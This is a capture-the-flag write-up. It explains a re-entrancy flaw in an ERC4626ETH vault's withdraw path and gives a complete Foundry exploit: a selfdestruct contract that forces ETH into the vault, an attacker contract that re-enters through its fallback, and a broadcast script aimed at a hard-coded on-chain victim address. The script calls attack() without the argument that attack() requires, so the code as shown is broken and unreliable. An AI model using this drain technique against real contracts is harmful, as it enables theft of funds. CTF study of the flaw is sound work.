## Tool Used:
Foundry

## Solution:

* Contract's `ERC4626ETH.sol`, function - `withdraw` OR `redeem` is vulnerable to re-entrancy.
* Both function `withdraw` AND `redeem`, uses `_withdraw` as common function for performing withrawal/redeem operation.
* Inside `_withdraw` function, Its calculating excess ETH by (total_ETH_balance - totalSupply) and this excess ETH will be transfer to actual owner 
of the vault.
* To get an extra ETH in the contract, there are two ways. One way is using `deposit` OR `mint` function, which will mint `VCT` Token and also increasing
ETH balance of a vault. Other way is by forcefully transferring ETH to a vault by self-destroying some dummy contract which is having some ETH. This
will increase ETH balance in a vault but not VCT Token supply.
* To get some excess ETH to transfer back to owner of the vault, we need to use 2nd way i.e, forcefully transfering ETH by self-destroying contract.
* We can transfer 1 ETH forcefully. So now we have 2 ETH in a vault and 1 VCT Token(owned by original owner of vault).
* To make balance of vault to 0 ETH, so that we can capture the flag, we need to understand below snippet from `_withdraw` function.
```solidity
function _withdraw(
    address caller,
    address payable receiver,
    address _owner,
    uint256 amount
) internal virtual {
    if (caller != _owner) {
        _spendAllowance(_owner, caller, amount);
    }

    uint256 excessETH = totalAssets() - totalSupply();

    _burn(_owner, amount);

    Address.sendValue(receiver, amount);
    if (excessETH > 0) {
        Address.sendValue(payable(owner()), excessETH);
    }

    emit Withdraw(caller, receiver, _owner, amount, amount);
}
```
1. First check - `if (caller != _owner)`, since there is no way to get an approval from actual owner, we need to bypass this check by having 
`caller == _owner. Both vaules are attacker controlled.
2. `uint256 excessETH = totalAssets() - totalSupply();`- Since we have 2 ETH in vault and 1 VCT Token, we get `excessETH = 2 -1 = 1`. So we get extra ETH
to send it back to vault owner.
3. `_burn(_owner, amount);` - In order to bypass burn function, we need to pass `amount = 0` and `_owner = contract_address_of_attacker`. Hence `caller`
should also be an address of the attacker's contract. This `_burn` function will not block us when amount = 0.
4. `Address.sendValue(receiver, amount);` - Since amount is zero, it will send 0 ETH to reciever, As `Address.sendValue()` function is performing `call`
on provided address, we get an external call to receiver, which we can make use to reneter the vault. So this `receiver` address must be attacker 
controlled contract address, which will let us use `fallback` function when transfering ETH using `call` function.
5. When excessETH > 0, it will transfer excessETH to vault owner, which is decrementing balance of vault in ETH.
```
if (excessETH > 0) {
    Address.sendValue(payable(owner()), excessETH);
}
```
6. After step 4, we will accept the 0 ETH transfer from vault in `fallback` function of attackers contract. Which will keep count on the number of times 
we need to call `withdraw` function to transfer all 2 ETH from contract. In this case it need to call one more time. Since during first `_withdraw` call,
transfer of 1st ETH is stored inside call stack. In second call of `withdraw` from fallback function, it will store 2nd ETH transfer inside call stack.
After this, no need to re-enter `withdraw` function. Once it will execute, all 2 ETH are sent to vault owner.
7. Once balance of vault is zero, we can call `captureTheFlag` function with attacker address.

### Exploit contract (For On-Chain)
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IVault {
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    
    function withdraw(
        uint256 assets,
        address receiver,
        address owner
    ) external returns (uint256);

    function deposit(uint256 assets, address receiver) external payable returns (uint256);

    function captureTheFlag(address newFlagHolder) external;

    function flagHolder() external returns (address);
}

contract SelfDestructable {
    constructor() public payable {}
    function destruct(address to) public {
        selfdestruct(payable(to));
    }
}

contract Attacker {        
    IVault vault;
    uint cnt = 0;

    constructor(address victim) public payable {
        vault = IVault(victim);
    }
    fallback() external payable {
        if (msg.value == 0) {
            cnt += 1;
        }
        if (cnt <= 1) {
            vault.withdraw(0 ether, address(this), address(this));
        }
    }

    function attack(address newFlagHolder) public {
        SelfDestructable d = new SelfDestructable{value: 1 ether}();
        d.destruct(address(vault));

        vault.withdraw(0 ether, address(this), address(this));
        vault.captureTheFlag(newFlagHolder);
    }
}

contract CTFScript is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        address victim = 0x8043e6836416d13095567ac645be7C629715885c;
        address attacker_eoa = 0xF5BED21BD285CBe352737F686766cCC19BeE7acC;
        console.log("Balance before victim:", victim.balance);
        console.log("Balance before attacker EOA:", attacker_eoa.balance);
        Attacker attacker = new Attacker{value: 1 ether}(victim);
        console.log("Balance before attacker:", address(attacker).balance);
        
        attacker.attack();

        console.log("Balance after victim:", victim.balance);
        console.log("Balance after attacker EOA:", attacker_eoa.balance);
        console.log("Balance after attacker:", address(attacker).balance);
    }
}
```
### Command to run - on-chain:
`forge script script/CTF.s.sol:CTFScript --rpc-url $rpc --private-key $pk --broadcast -vvvv`

### Command to run - fork environment: 
`forge test -c ./test/CTF.t.sol --fork-url $rpc --etherscan-api-key $ETHERSCAN_API -vvvv`
